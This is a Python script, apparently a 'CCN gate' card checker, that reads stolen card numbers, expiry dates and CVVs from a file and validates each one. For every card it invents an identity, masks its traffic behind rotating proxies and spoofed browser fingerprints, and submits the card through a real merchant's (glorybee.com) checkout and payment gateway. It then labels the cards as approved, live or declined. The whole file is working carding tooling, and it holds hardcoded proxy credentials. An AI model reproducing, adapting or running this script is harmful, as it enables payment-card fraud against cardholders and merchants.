import random
import time
from faker import Faker
from random import choice
from curl_cffi import requests
# Eliminamos la importación de colorama para evitar inyección de caracteres ANSI:
# from colorama import init, Fore 
from fake_useragent import UserAgent
import os


# -------------------------
# CONFIGURACIÓN DEL PROXY
# -------------------------
proxy_login = os.environ.get('PROXY_LOGIN', '6c87cc76d68ca38831bf')
proxy_password = os.environ.get('PROXY_PASSWORD', '918d291b0f3847af')
proxy_host = os.environ.get('PROXY_HOST', 'gw.dataimpulse.com')
proxy_port = os.environ.get('PROXY_PORT', '823')

proxy_url_auth = f'http://{proxy_login}:{proxy_password}@{proxy_host}:{proxy_port}'
proxies = {
    "http": proxy_url_auth,
    "https": proxy_url_auth,
}
# -------------------------


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None


def ccn_gate(card):
    max_retries = 10
    retry_count = 0
    
    # Validar el formato de entrada
    if card.count('|') < 3:
        return f"{card}|ERROR|N/A|Formato de tarjeta incompleto (CC|MM|YYYY|CVV)."

    cc_number, mes, ano_number, cvv = card.split('|')
    if len(ano_number) == 4: ano_number = ano_number[2:4]
    
    # ----------------------------------------------------
    # CORRECCIÓN: Los datos de usuario se obtienen solo una vez.
    u_info = usuario()
    name  = u_info['name'].split(' ')[0]
    last  = u_info['name'].split(' ')[1]
    number = random.randint(1111, 9999)
    street = f"{name}+street+{number}"
    email = u_info['email']
    phone = u_info['phone']
    # ----------------------------------------------------

    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            cliente = requests.Session(impersonate=choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
            cliente.proxies = {"https": "http://ckwvyrbn-rotate:9bdwth8dgwwq@p.webshare.io:80"}
            agente_user = UserAgent().random

            #============[Requests 1-6: Flujo de Compra]============#
            headers = {"User-Agent": agente_user, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" }
            result  = cliente.get(url="https://glorybee.com/queen-excluders", headers=headers)
            form_key = capture(result.text, 'name="form_key" type="hidden" value="', '"')

            headers = {"Cookie":f"form_key={form_key};","User-Agent": agente_user,"Accept": "application/json, text/javascript, */*; q=0.01","X-Requested-With": "XMLHttpRequest","Content-Type": "application/x-www-form-urlencoded","Origin": "https://glorybee.com","Referer": "https://glorybee.com/queen-excluders"}
            data    = {"product": "21873","selected_configurable_option": "","related_product": "","item": "21873","form_key": form_key,"super_attribute[183]": "6440","qty": "1"}
            result  = cliente.post(url="https://glorybee.com/checkout/cart/add/uenc/aHR0cHM6Ly9nbG9yeWJlZS5jb20vcXVlZW4tZXhjbHVkZXJz/product/21873/", data=data, headers=headers)

            headers = {"User-Agent": agente_user,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Referer": "https://glorybee.com/queen-excluders"}
            result  = cliente.get(url="https://glorybee.com/checkout/cart/", headers=headers)
            form_id = capture(result.text, '"entity_id":"', '"')

            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/json","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
            data    = {"customerEmail":email}
            result  = cliente.post(url="https://glorybee.com/rest/default/V1/customers/isEmailAvailable", json=data, headers=headers)

            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/json","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
            data    = {"addressInformation":{"shipping_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","extension_attributes":{"delivery_date":"","time_slot":"","location_id":"","location_address":""}},"billing_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","saveInAddressBook":None},"shipping_method_code":"GND","shipping_carrier_code":"shqups","extension_attributes":{}}}
            result  = cliente.post(url=f"https://glorybee.com/rest/default/V1/guest-carts/{form_id}/shipping-information", json=data, headers=headers)

            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
            data    = "payment_method=paya"
            result  = cliente.post(url="https://glorybee.com/magecomp_surcharge/checkout/applyPaymentMethod/", data=data, headers=headers)

            #============[Requests 7: Envío de CC al Gateway]============#
            headers = {"User-Agent": agente_user,"Accept": "application/json, text/javascript, */*; q=0.01","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
            data    = f"form_key={form_key}&cardNumber={cc_number}&cardExpirationDate={mes}{ano_number}&cvv={cvv}&billing%5Bname%5D={name}+{last}&billing%5Baddress%5D={street}&billing%5Bcity%5D=EUGENE&billing%5Bstate%5D=Oregon&billing%5BpostalCode%5D=10080&billing%5Bcountry%5D=US&shipping%5Bname%5D={name}+{last}&shipping%5Baddress%5D={street}&shipping%5Bcity%5D=eugene&shipping%5Bstate%5D=Oregon&shipping%5BpostalCode%5D=97402&shipping%5Bcountry%5D=US"
            result  = cliente.post(url="https://glorybee.com/paya/checkout/request", data=data, headers=headers)
            
            # --- Extracción y Limpieza del Mensaje ---
            message_text = "UNKNOWN_MESSAGE"
            message_code = "UNKNOWN_CODE"
            
            try:
                # Intenta parsear como JSON y extraer la respuesta del gateway
                payment_response = result.json()['paymentresponse']
                message_text_raw = capture(payment_response, '"message":"', '"')
                message_code = capture(payment_response, '"code":"', '"')
                
                # *** LIMPIEZA CLAVE ***: Si contiene '|' tomamos el mensaje limpio.
                if message_text_raw and '|' in message_text_raw:
                    parts = message_text_raw.split('|')
                    message_text = parts[5].strip() if len(parts) >= 6 else message_text_raw
                elif message_text_raw:
                     message_text = message_text_raw
            except Exception:
                # Si falla el JSON, intenta obtener una respuesta basada en texto.
                if "invalid card number" in result.text.lower():
                    message_text = "Invalid Card Number"
                    message_code = "400"
                elif "declined" in result.text.lower():
                    message_text = "Transaction Declined"
                    message_code = "DECLINE_TEXT"
                
            # Asignar valores por defecto si siguen vacíos
            message_text = message_text if message_text else "UNKNOWN_MESSAGE"
            message_code = message_code if message_code else "UNKNOWN_CODE"


            #============[Lógica de Respuestas y Retorno en Formato Estándar]============#

            if "AVS FAILURE" in result.text:
                # Formato: CC|MM|YYYY|CVV|STATUS|MESSAGE|CODE|
                return f"{card}|APPROVED|AVS FAILURE|{message_code}|"
            
            elif "There was a problem with the request." in message_text:
                return f"{card}|PROBABLE LIVE|{message_text}|{message_code}|"

            elif "CVV2 MISMATCH" in message_text:
                return f"{card}|APPROVED|CVV2 MISMATCH|{message_code}|"

            # Retorno por defecto para DECLINED o cualquier otra respuesta
            return f"{card}|DECLINED|{message_text}|{message_code}|"
            
        except Exception as e:
            # Eliminamos la impresión de error para no contaminar la salida
            # print(f"Error: {e}") 
            retry_count += 1
            time.sleep(1) 
            continue
            
    # Retorno si se agotan los reintentos
    return f"{card}|ERROR|Max Retries|Fallo de conexión o límite de intentos ({max_retries} reintentos)." 


if __name__ == "__main__":
    file = open('card.txt', 'r')
    lines = file.readlines()
    for position, x in enumerate(lines):
        try:
            parts = x.strip().split("|")
            cc, mes, ano, cvv = parts[:4]
            card_input = f"{cc}|{mes}|{ano}|{cvv.strip()}"
            gateway_result = ccn_gate(card_input)
            print(gateway_result)
        except Exception:
            # En caso de que la línea no tenga formato correcto
            print(f"{x.strip()}|ERROR|N/A|Formato incorrecto en la línea")

        # Esto asegura que el archivo se actualice correctamente
        with open('card.txt', "w")as f:
            f.writelines(lines[position+1:])
            f.close()